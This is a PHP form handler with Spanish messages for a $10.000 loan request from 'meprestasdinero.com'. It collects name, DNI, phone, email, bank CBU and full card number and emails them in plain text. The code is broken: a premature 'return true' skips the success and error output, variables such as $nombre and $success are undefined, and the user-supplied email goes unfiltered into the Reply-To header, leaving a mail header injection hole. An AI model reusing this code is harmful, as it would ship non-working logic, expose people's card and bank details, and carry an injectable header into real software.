<?php

function validar_campo($campo)
{
	$campo = trim($campo);
	$campo = stripcslashes($campo);
	$campo = htmlspecialchars($campo);

	return $campo;
}
   $errorMSG = "";
 
// NAME
	if (empty($_POST["name"])) {
    $errorMSG = "Falta colocar el Nombre";
	} else {
    $name = validar_campo($_POST["name"]);
	}
	if (empty($_POST["DNI"])) {
    $errorMSG = "Falta colocar el DNI";
	} else {
    $dni = validar_campo($_POST["DNI"]);
	}
	//Telefono
	if (empty($_POST["telCard"])) {
    $errorMSG = "Falta colocar el telefono";
	} else {
    $telefono = validar_campo($_POST["telCard"]);
	}
	//Monto
	if (empty($_POST["emailCard"])) {
    $errorMSG = "Falta colocar el correo";
	} else {
    $correo = validar_campo($_POST["emailCard"]);
	}
	//CBU
	if (empty($_POST["CBU"])) {
    $errorMSG = "Falta colocar el CBU.";
	} else {
    $cbu = validar_campo($_POST["CBU"]);
	}
	if (empty($_POST["number"])) {
    $errorMSG = "Falta colocar el numero de tarjeta.";
	} else {
    $nrotarjeta = validar_campo($_POST["number"]);
	}
	//Terminos
	if (empty($_POST['terminos'])) {
    $errorMSG = "Debe aceptar los términos y condiciones.";
	} else {
    $terminos = $_POST["terminos"];
	}


	$bodymsg = "Nueva solicitud de $10.000 recibida.\n\n"."Detalles:\n\nNombre: $name\n\nDNI: $dni\n\nMonto: $10.000\n\nCBU: $cbu\n\nNumero de tarjeta: $nrotarjeta\n\nTeléfono: $telefono\n\nCorreo: $correo\n\n";
	$headers = "From: noreply@meprestasdinero.com\n";
	$mailto = 'info@meprestasdinero.com';
	$headers .= "Reply-To: $correo";
	$subject = "[SOLICITUD] Nueva solicitud de dinero [$10.000]:  $nombre";


	mail($mailto, $subject, $bodymsg, $headers);
	return true;

	if ($success && $errorMSG == ""){
   echo "success";
	}else{
    if($errorMSG == ""){
        echo "Something went wrong :(";
    } else {
        echo $errorMSG;
    }
}
 
?>